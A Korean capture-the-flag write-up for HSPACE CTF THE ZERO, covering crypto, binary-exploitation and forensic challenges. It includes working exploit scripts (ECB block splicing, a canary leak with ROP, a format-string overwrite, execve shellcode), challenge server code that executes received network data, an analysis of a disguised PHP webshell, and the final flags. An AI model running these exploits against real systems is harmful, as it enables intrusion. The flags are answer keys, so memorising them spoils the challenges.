---
title: "HSPACE CTF THE ZERO Write-up(2)"

categories:
  - writeup

tags: [system, crypto, forensic, misc, writeup]

---


## [CRYPTO] electronic codebook

간단한 ECB 문제입니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2049.png)

문제 페이지에서 간단하게 사용법을 확인할 수 있으며

페이지 소스보기를 통해 문제의 소스코드를 확인할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2050.png)

```python
from flask import Flask, request, render_template_string 
from hashlib import md5
from base64 import b64decode, b64encode
from Crypto.Cipher import AES

from hspace import *

BLOCK_SIZE = 16  # Bytes

app = Flask(__name__)
app.secret_key = secret_key 

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class AESCipher:
    def __init__(self, key):
        self.key = md5(key.encode('utf8')).hexdigest()

    def encrypt(self, raw):
        raw = pad(raw)
        cipher = AES.new(self.key.encode("utf8"), AES.MODE_ECB)
        return b64encode(cipher.encrypt(raw.encode('utf8')))

    def decrypt(self, enc):
        enc = b64decode(enc.encode('utf8'))
        cipher = AES.new(self.key.encode("utf8"), AES.MODE_ECB)
        return unpad(cipher.decrypt(enc)).decode('utf8')

target = "i am king got admin!"

@app.route('/')
def main():
  return "<h1>ECB</h1><br>/enc?value=<br>/dec?value=<!-- /source -->"

@app.route('/enc') 
def ecb_enc():
  data = request.args.get('value') or None
  if data == None:
    return "need argument..."
  if target in data:
    return "nono..."

  try:
    return AESCipher(pwd).encrypt(data)
  except Exception as e:
    return "error!"+str(e)

@app.route('/dec')
def ecb_dec():
  data = request.args.get('value') or None
  data = data.replace(" ","+")
  if data == None:
    return "need argument..."
  try:
    dec_data = AESCipher(pwd).decrypt(data)
    if target == dec_data:
      # here is your FLAG!
      return flag
    else:
      return dec_data
  except Exception as e:
    return "error!"+str(e)  

@app.route('/source')
def view_code():
  return open('app.py','r').read()

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
```

ecb_dec함수에서 복호화를 했을 때, target 변수인 "i am king got admin!"과 일치하면 flag를 반환하는 문제입니다.

하지만 ecb_enc 함수에서 "i am king got admin!" 이 있을 경우 암호화를 하지 않는 것을 확인할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2051.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2052.png)

ecb 암호화는 블록 단위로 암호화를 진행하기 때문에 블록 단위로 끊어서 "i am king got admin!" 문자열을 암호화 한 후 연결하여 다시 복호화 하면 문제를 해결 할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2053.png)

```python
import base64
import requests
import urllib.parse as up

url    = "http://ecb.imreplay.com"

target = "i am king got admin!"
target1 = target[:16]
target2 = target[16:]
print(f"t1 = {target1}\nt2 = {target2}")

r1 = requests.get(f"{url}/enc?value={target1}").text
print(f"r1 = {r1}")

r2 = requests.get(f"{url}/enc?value={target2}").text
print(f"r2 = {r2}")

r1 = base64.b64decode(r1.encode())
r2 = base64.b64decode(r2.encode())

data = r1[:16]+r2
data = base64.b64encode(data)
data = up.quote(data)

flag = requests.get(f"{url}/dec?value={data}").text
print(flag)
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2054.png)

FLAG: hspace{Hell0_Electr0nic_C0deBook!}

## [CRYPTO] Baby_crypto

- 문제 출제 의도 : 간단한 패킷 분석 능력과 RSA 암호화 알고리즘의 이해 및 복호화 실습을 위해 제출 하였습니다.

**[문제 구성]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2055.png)

 문제를 확인해 보면 Packet Capture 도구로 확인할 수 있는 .pcapng 파일 하나를 다운 받을 수 있습니다.

해당 문제는 아래와 같은 과정을 거쳐서 만들어졌습니다.

```python
/*client*/
from socket import *
import time

p = (2**127)-1
q = (2**107)-1
n = p * q
e = 65537

phi = (q-1)*(p-1)

clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect(('192.168.40.144', 7777))

msg = 'hspace{1_w4nt_t0_b3_4_zz4ngzz4ng_H4ck3r!!}'

def get_private_key(e, phi):
    k=1
    while(e*k)%phi != 1 or k ==e:
        k+=1
    return k

def encrypt(e, n, plaintext):
    public_key  = e
    cipher = [(ord(char) ** public_key) % n for char in plaintext]

    return cipher

def decrypt(d, n, cipher_text):
    key = d
    plain = [chr((char ** key) % n ) for char in cipher_text]

    return "".join(plain)

print(type(clientSock))

cipher_msg = encrypt(e, n, msg)

clientSock.sendall("ls".encode('utf-8'))

clientSock.close()
```

클라이언트는 공개키를 이용해 Plaintext를 한 글자씩 암호화한 후 UDP 통신을 사용해 Server에 송신합니다.

```python
/*server*/
from socket import *
import os

serverSock = socket(AF_INET, SOCK_STREAM)
serverSock.bind(('192.168.40.144', 7777))
serverSock.listen(1)

clientSock, addr = serverSock.accept()

while(1):
    client_data = serverSock.recv(1024)
    print(client_data)
    os.system(str(client_data.decode('utf-8')))
    if client_data == "end":
        break
    print(client_data)
    

serverSock.close()
```

암호화된 text가 담긴 패킷은 7777포트를 이용하여 한 글자씩 전송됩니다. 

이때 패킷 분석을 어렵게 하기 위해 script구문을 실행시켜 더미 패킷을 추가하였습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2056.png)

위 그림과 같이 7777번 포트로 암호화된 값이 들어오는 것을 확인 할 수 있습니다.

**[문제 풀이]**

여러분에게는  n과 e 값이 있습니다. n의 길이는 비교적 짧으며 e의 값도 65537입니다.

1. 암복호와 툴을 사용하여 패킷의 암호화 코드로부터 평문을 뽑아냅니다.

```bash
python3 RsaCtfTool.py -n 27606985387162255149739023449107931668458716142620601169954803000803329 -e 65537 --uncipher 27316745514101158385900734386295186110095058620648243002845123389986041
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2057.png)

그 결과 그림과 같이 긴 string이 하나의 문자인 것을 확인할 수 있습니다.

남은 패킷에도 위 과정을 적용해주면 flag를 획득할 수 있습니다.

가장 쉬우면서도 빠른 방법입니다.

2. 직접 코드를 작성하여 복호화를 시도합니다.

$$P = C^d mod(n)$$

개인키 d 값을 알기 위해 phi 값이 필요합니다. 

n값의  크기가 작기 때문에 phi 값을 구하기가 비교적 수월합니다.

정수 인수분해 계산기를 통해 phi 값을 구해냅니다.(직접 코드를 작성해도 좋습니다!)

이때 phi = 27606985387162255149739023449107761527112996396559656119259509106409476이 나옵니다.

**python code to Decryption**

```python
from gmpy2 import *

n = 27606985387162255149739023449107931668458716142620601169954803000803329
e = 65537
phi = 27606985387162255149739023449107761527112996396559656119259509106409476
#d = divm(1, e, phi)
#d = invert(e, phi)

print(d)

crypto =[
27316745514101158385900734386295186110095058620648243002845123389986041,
8142079287916652568932804601205837242496310109866232196019822529887053,
26090937741967256528490882060405710044623048396371529861477958948488740,
20689318060990831905551173102000242056716750852747860614320457155844751,
19318394092050673441664278189645936731148655811171928555544276008109709,
3748022726397618855412730898316585913377073472384407425945520023324246,
13056217731878391056382517437204571759729475553887344092823453555010151,
9917395344429272355524429544837761929473554508203842016077371215591551,
13176419365557272430324435004225330322380427888842754816869934474497220,
9532574409901189334797348878856071641047295777308127906066879976146700,
780757980829311560541496599608074119046681534016243912313196266272656,
12801762651168911244444671235565507237120835804115390045534299156591534
//이하 생략
 ]

result =''

for i in range(len(crypto)):
	result += chr(int((hex(pow(crypto[i], d, n))), 16))
	print("Current Plaintext : " + result)

print("flag : " + result)
```

C (암호문), d (개인키), n (p, q의 곱) 우리가 알고 있는 것은 이 3가지입니다.

$$P = C^d mod (n) $$

이기에 우리는 평문을 구할 수 있습니다. 

pow를 사용하여 값을 처리해 줍니다!

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2058.png)

그럼 위 그림과 같이 flag를 얻을 수 있습니다.

FLAG: hspace{1_w4nt_t0_b3_4_zz4ngzz4ng_H4ck3r!!}

## [CRYPTO] Desperado

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__17.png)

FLAG: hspace{Did_you_know_parity_bits_are_ignored_in_DES?}

## [SYSTEM] Seoul Housing

```python
w**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    **Canary found**
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2059.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2060.png)

- welcome() [offset **0x88A**]

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2061.png)

- **Red Box** : **Canary**
- **Purple Box** : **SFP(Stack Frame Pointer)**
- **Green Box** : **RET**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2062.png)

- init()
- &[pop r15; ret] + 1 → [pop rdi; ret]

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2063.png)

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9100)
e = ELF(bi)
context.arch = 'amd64'

welcome = 0x88a

pay = 'A'*0x109
r.sendafter('input > ', pay)
r.recvuntil(pay)
canary = u64(r.recv(7).rjust(8,'\x00'))
base = u64(r.recv(6).ljust(8,'\x00')) - 0xa10
log.info("canary @ {}".format(hex(canary)))
log.info("base @ {}".format(hex(base)))

sh = base + e.search('sh').next() # ps -ash
system = base + welcome + 11 # call system
prdi = base + e.search(asm('pop rdi; ret')).next()

pay = 'A'*0x108
pay += p64(canary)
pay += 'B'*8
pay += p64(prdi)
pay += p64(sh)
pay += p64(system)
r.sendafter('input > ', pay)

r.interactive()
```

FLAG: hspace{glaD_yoU_havE_thE_sH_strinG}

## [SYSTEM] Financial Stability Forum

```python
**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    **Canary found**
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2064.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2065.png)

- fsb(Format String Bug)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2066.png)

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9101)
context.arch = 'amd64'

pay = '%p|'*8
r.sendlineafter('> ', pay)
leak = r.recvline().strip().split('|')
print leak
libc = int(leak[2], 16) - 0x110151
stack = int(leak[5], 16) - 0xe0 # ret
print hex(libc), hex(stack)

pay = fmtstr_payload(8, {stack: libc+0x4f3d5}) # one_gadget
r.sendlineafter('> ', pay)

r.interactive()
```

FLAG: hspace{typinG_2_iS_toO_easY}

## [SYSTEM] No sc

```python
**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    No canary found
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2067.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2068.png)

- x64 Shell Code

```python
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push 'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9102)
context.arch = 'amd64'

r.sendline(asm(shellcraft.amd64.linux.sh()))
r.interactive()
```

FLAG: hspace{sC_iN_koreA_iS_biG_deaL}

## [SYSTEM] Gambling 1

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__6.png)

FLAG: hspace{Let's_go_up_to_100_million_Bitcoin!!}

## [SYSTEM] Gambling 2

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__10.png)

FLAG: hspace{money_can_be_copied!!!}


## [FORENSIC] nnennory_20H2

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_1.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_2.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_6.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_7.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_11.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_17.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_19.png)

FLAG: hspace{I_never_dreamed_about_memory}

## [FORENSIC] Emergency In hack

Plus Tip: 실제 서비스 환경처럼 리얼리티 하게 진행하기 위해 APM(Apache, PHP, MySQL)를 각각 컴파일로 설치하여 필요한 것 만 설치 → (Apache: Web Root Dir, Log Dir, Config Dir 달라짐), (PHP: php.ini 위치, config 위치 달라짐)

실제 공격 사례와 시나리오를 모티브로 제작

Hint로 공격 당시 Pcap를 제공 하였으므로, Web Log의 Access, Error는 살펴볼 필요는 없다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2073.png)

1-1.  문제 다운로드 및 압축 해제 하기 (Pcap, OVA → VMware files)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2074.png)

1-2. Wireshark Protocol list중 IPv4 → TCP → (TLS, HTTP)가 존재

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2075.png)

1-3. IPv4 list에서 (172.16.37.4 / 172.16.37.5 / 172.16.37.12, 172.16.37.69)로 총 4개의 IP 존재를 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2076.png)

1-4. TCP list (172.16.37.4 / 172.16.37.12 / 172.16.37.69) → 동적 포트 (Dynamic Port) 클라이언트

172.16.37.5는 고정 포트 (80, 443) 서버일 가능성이 높다

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2077.png)

1-5. HTTP object list 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2078.png)

1-6. HTTP object list에서 POST의 "application/x-www-form-urlencoded"로 전송되는 데이터 확인 (비정상 행위 X)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2079.png)

1-7.  HTTP GET method 필터링으로 검색 (너무 많은 패킷의 양)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2080.png)

1-8. HTTP POST Method 필터링으로 검색 (너무 많고, 비 정상 행위 X) 

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2081.png)

1-9. TLS Packet에서는 443 Port 암호화하여 통신하는 패킷을 찾을 수 있음.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2082.png)

2-1 . 가상머신을 실행시키면 위 와 같이 시나리오 상 웹페이지가 변조된걸 볼 수 있음. (HTTP 접근시)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2083.png)

2-2. HTTPS로 접근시 최신 브라우저 사용시 SSL 알고리즘 상 브라우저에서 차단됨. (공격 당시 취약한 환경에서 SSL 패킷을 분석할 수 있도록 취약한 알고리즘을 선택하기 위해 최신 브라우저에서는 못들어오도록 차단설정함.) → 분석 혼동을 막기 위한 조치 Elliptic Curve Diffie-Hellman Exchange — 타원곡선 디피헬만 키교환 활성화 되어 있으면 서버의 비밀키로도 복호화 X

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2084.png)

2-3. 메인 페이지 접근(/index.php)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2085.png)

2-4. 많은 게시판중 "고객 게시판"에만 유일하게 글이 작성되어 있고, 로그인을 하지 않아도 글이 작성됨.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2086.png)

2-5. 위와 같이 차례대로 게시글이 눌러서 확인해보면 "s.jpg", ".htaccess" 파일과 "photo.png" 파일을 업로드된 걸 볼 수 있음. ".htaccess" 파일의 경우 해당 디렉터리에 접근제어 (Apache 설정)을 변경할 수 있음

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2087.png)

2-6. 첨부 파일인 ".htaccess" 파일 다운로드 시도시 위 그림와 같이 "파일이 존재 하지 않습니다." 문구가 출력됨.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2088.png)

2-7. 첨부 파일인 "photo.png" 파일 다운로드 시도시 위 그림와 같이 "파일이 존재 하지 않습니다." 문구가 출력됨. 

파일을 삭제를 하기 위해서는 정상적인 게시글 수정 절차를 거치면 파일이 존재하지 않지만. 현재는 비정상적인 행위로 인해 파일 목록만 존재하고 실제 파일은 존재하지 않으므로, 공격 행위일 가능성이 높다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2089.png)

3-1. Pcap 파일은 Wireshark로 분석을 할 수 있지만 한눈에 보기 위해 "Network Miner"도 종종 사용된다.

위 그림와 같이 "172.16.37.5"가 리눅스인걸 알 수 있다. (TTL로 파악)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2090.png)

3-2. 삭제된 게시글에 업로드된 해당 파일을 검색 해보았지만 존재하지가 않는다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2091.png)

3-3. 삭제된 게시글에 업로드된 해당 파일을 검색 해보았지만 존재하지가 않는다.

평문 HTTP에서는 더이상 이상행위가 기록되지 않았음으로, TLS(암호화된) 패킷을 분석을 시도한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2092.png)

4-1. TLS 키 교환 하기전 Client가 사용할 암호 알고리즘 리스트를 서버측에 전송한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2093.png)

4-2. Diffie-Hellman 디피헬만 암호화 방식이 아닌 서버의 비밀키로 복호화가 가능한 취약한 알고리즘으로 연결을 시도

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2094.png)

5-1. 제공된 계정으로 서버에 로그인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2095.png)

5-2. 웹 루트 디렉터리를 찾는다. (패키지로 아파치를 설치했다면 기본적으로 /var/www/html/"에 존재 하지만 현재 컴파일 작업으로 웹 루트 디렉터리가 다른곳으로 설정되어 있다.

찾는 방법은 프로세스를 추적하여 설정 값을 보거나 아니면 위와 같이 php 파일 및 아파치 설정 파일을 검색하여 위치를 찾을 수 있다. ("/usr/local/dongdonge/htdocs/")

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2096.png)

5-3. "/usr/local/dongdonge/conf/extra"의 ssl 관련 설정값 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2097.png)

5-4. SSL Server Private key 위치 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2098.png)

5-5. SSL 관련 키 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2099.png)

6-1. 비밀키를 추출하여 Wireshark에 서버 아이피 "172.16.37.5"와 TLS으로 암호화된 서비스의 포트 443과 Key를 등록한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20100.png)

6-2. 암호화된 TLS 패킷이 복호화되어 평문으로 보여진다.

그리고 평문으로 보여지고 POST 값으로 필터링하여 검색한 결과 복호화 하기전 찾지 못했던 "photo.png" 파일에 Method "POST"로 여러번 요청한 값을 확인할 수 있다.

웬만하면 이미지 파일(jpg, png, jpeg 등등)에 GET으로 요청하지, POST로는 요청하지 않는다.

웹쉘 경우 GET으로 명령어 사용시 서버측 Access 로그에 행위가 기록됨으로, 대부분 악성 웹쉘은 POST로 전송한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20101.png)

6-3. 공격자가 3개의 파일 "s.jpg", "photo.jpg", ".htaccess" 파일이 업로드된걸 볼 수 있으며,

그중 "s.jpg" 파일은 정상 이미지 파일로 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20102.png)

6-4. 하지만 "photo.png"의 시그니처와 업로드된 파일 내용을 보면 이미지가 아닌 eval함수와 알수 없게 암호화된 값이 삽입되어 있는걸 볼 수 있으며,

".htaccess" 파일의 경우 php 실행 파일을 ".php" 뿐만 아니라 ".jpg", ".jpeg", ".png" 파일도 PHP 코드로 실행할 수 있도록 설정되어 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20103.png)

6-5. 업로드된 악성 쉘 (웹쉘)을 분석하기 위해 "photo.png"로 연결된 패킷을 필터하고 검색한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20104.png)

6-6. 처음에는 GET으로 1차 연결한다. 하지만 해당 웹쉘은 타사용자와 서버 관리자에게는 보여지면 안되기에 서버에서는 응답으로 200OK를 반환하지만 리스폰 되는 값은 페이크로 "해당 페이지가 존재하지 않습니다"라는 404 Not Found로 보여지게 된다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20105.png)

6-7. 이후 POST로 웹쉘을 작동하기 위해 패스워드를 "Beretta92"를 삽입하여 웹쉘이 동작하도록 수행한다.

이후 "CMD" 파라미터에 "ls" 명령어를 실행한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20106.png)

6-8. 응답값을 확인하여 웹쉘이 정상적으로 작동하여 명령이 실행된걸 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20107.png)

6-9. 그리고 특정 명령 "aa"를 삽입하여 무언가 행위가 이뤄지고 해당 경로에 플래그와 index.html 파일이 압축이 해제된걸 볼 수 있다.

